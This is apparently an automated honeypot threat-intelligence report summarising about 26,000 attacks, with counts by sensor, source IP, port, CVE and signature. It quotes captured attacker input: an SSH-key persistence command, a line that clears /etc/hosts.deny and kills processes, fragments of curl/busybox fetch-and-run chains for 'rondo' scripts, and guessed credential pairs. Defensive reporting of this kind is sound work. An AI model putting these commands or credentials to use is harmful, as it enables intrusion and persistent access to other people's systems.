Honeypot Attack Summary Report

Report Generated: 2025-10-24T08:01:58Z
Timeframe: 2025-10-24T07:20:01Z to 2025-10-24T08:00:01Z
Files used to generate this report:
- agg_log_20251024T072001Z.json
- agg_log_20251024T074001Z.json
- agg_log_20251024T080001Z.json

Executive Summary
This report summarizes 25,968 attacks recorded by honeypots over a 40-minute period. The most frequent attacks were network scans and probes, with a significant number of attempts to exploit vulnerabilities related to VNC, SMB, and RDP. The majority of attacks originated from a diverse set of IP addresses, with a notable concentration from a few specific sources. Attackers were observed attempting to gain unauthorized access and execute commands to gather system information and establish persistence.

Detailed Analysis:

Attacks by honeypot:
- Suricata: 8,785
- Dionaea: 4,624
- Honeytrap: 4,296
- Cowrie: 3,591
- Heralding: 2,314
- Ciscoasa: 1,744
- Sentrypeer: 443
- ElasticPot: 32
- ConPot: 26
- Tanner: 23
- Mailoney: 22
- Redishoneypot: 15
- H0neytr4p: 18
- Honeyaml: 6
- Adbhoney: 4
- Dicompot: 3
- Ipphoney: 1

Top attacking IPs:
- 109.205.211.9: 2,567
- 217.57.178.178: 2,446
- 14.191.249.60: 2,406
- 185.243.96.105: 2,332
- 10.140.0.3: 2,314
- 80.94.95.238: 1,206
- 103.160.232.131: 820
- 113.180.212.88: 952
- 58.147.171.11: 316
- 195.96.129.91: 312

Top targeted ports/protocols:
- 445: 4,560
- TCP/445: 2,441
- vnc/5900: 2,314
- 22: 430
- 5060: 443
- 23: 216
- 8333: 145
- 5901: 114
- 5903: 120
- TCP/80: 64

Most common CVEs:
- CVE-2002-0013 CVE-2002-0012: 8
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 6
- CVE-2024-12856 CVE-2024-12856 CVE-2024-12885: 3
- CVE-2019-16920 CVE-2019-16920: 2
- CVE-2021-35395 CVE-2021-35395: 2
- CVE-2016-20017 CVE-2016-20017: 2
- CVE-2014-6271: 2
- CVE-2023-52163 CVE-2023-52163: 2
- CVE-2023-47565 CVE-2023-47565: 2
- CVE-2023-31983 CVE-2023-31983: 2
- CVE-2024-10914 CVE-2024-10914: 2
- CVE-2009-2765: 2
- CVE-2015-2051 CVE-2019-10891 CVE-2024-33112 CVE-2025-11488 CVE-2025-11488 CVE-2024-33112 CVE-2022-37056 CVE-2019-10891 CVE-2015-2051: 2
- CVE-2024-3721 CVE-2024-3721: 2
- CVE-2006-3602 CVE-2006-4458 CVE-2006-4542: 2
- CVE-2021-42013 CVE-2021-42013: 2
- CVE-1999-0183: 1
- CVE-2018-11776: 1
- CVE-2019-11500 CVE-2019-11500: 1

Commands attempted by attackers:
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...": 18
- lockr -ia .ssh: 18
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 18
- cat /proc/cpuinfo | grep name | wc -l: 17
- w: 17
- uname -a: 17
- whoami: 17
- lscpu | grep Model: 17
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 17
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 17
- ls -lh $(which ls): 17
- which ls: 17
- crontab -l: 17
- uname -m: 17
- cat /proc/cpuinfo | grep model | grep name | wc -l: 17
- top: 17
- uname: 17
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 17
- Enter new UNIX password: : 8
- Enter new UNIX password:: 8
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;: 5
- Accept-Encoding: gzip: 2

Signatures triggered:
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 2,432
- ET INFO VNC Authentication Failure: 2,314
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 1,989
- ET HUNTING RDP Authentication Bypass Attempt: 712
- ET DROP Dshield Block Listed Source group 1: 382
- ET SCAN NMAP -sS window 1024: 174
- ET INFO Reserved Internal IP Traffic: 53
- GPL INFO SOCKS Proxy attempt: 28
- ET SCAN Sipsak SIP scan: 30
- ET CINS Active Threat Intelligence Poor Reputation IP group 49: 16

Users / login attempts:
- 345gs5662d34/345gs5662d34: 18
- /Passw0rd: 12
- root/3245gs5662d34: 7
- User-Agent: Go-http-client/1.1/Connection: close: 15
- root/derbish: 4
- root/3edc$rfv5tgb: 4
- root/des100de: 4
- root/Deus3387: 4
- root/dfr5tsd3hd: 4
- root/dgda_14: 4
- /1q2w3e4r: 6
- GET /solr/admin/info/system HTTP/1.1/Host: 161.35.180.163:23: 3
- GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1/Host: 161.35.180.163:23: 3
- GET /v2/_catalog HTTP/1.1/Host: 161.35.180.163:23: 3
- GET /cgi-bin/authLogin.cgi HTTP/1.1/Host: 161.35.180.163:23: 3
- GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1/Host: 161.35.180.163:23: 3
- /passw0rd: 5
- root/arch: 3
- mark/changeme: 3
- suporte/123: 3
- root/1qazxsw@: 3
- root/zaq1@WSX: 3

Files uploaded/downloaded:
- rondo.dgx.sh||busybox: 7
- rondo.dgx.sh||curl: 7
- rondo.dgx.sh)|sh&: 7
- server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=: 6
- 104.199.212.115: 5
- rondo.qre.sh||busybox: 4
- rondo.qre.sh||curl: 4
- rondo.qre.sh)|sh: 4
- cfg_system_time.htm: 4
- 129.212.146.61: 4
- system.html: 3
- rondo.tkg.sh|sh&echo: 3
- login_pic.asp: 2
- apply.cgi: 4
- rondo.sbx.sh|sh&echo${IFS}: 2
- `busybox: 2
- 34.165.197.224:8088: 2

HTTP User-Agents:
- None

SSH clients:
- None

SSH servers:
- None

Top attacker AS organizations:
- None

Key Observations and Anomalies
- A high volume of VNC, SMB, and RDP related attacks suggests a focus on remote access services.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` was attempted multiple times, indicating efforts to establish persistent SSH access.
- A wide variety of CVEs were targeted, with a mix of old and recent vulnerabilities.
- Several files with names like "rondo.dgx.sh" were downloaded, likely part of a malware campaign.
- The lack of HTTP User-Agents, SSH clients/servers, and AS organization data might indicate that the honeypots capturing this data were not targeted or the data was not available in the logs.
- The presence of internal IP addresses (10.140.0.3) suggests potential internal network scanning or misconfigured honeypots.
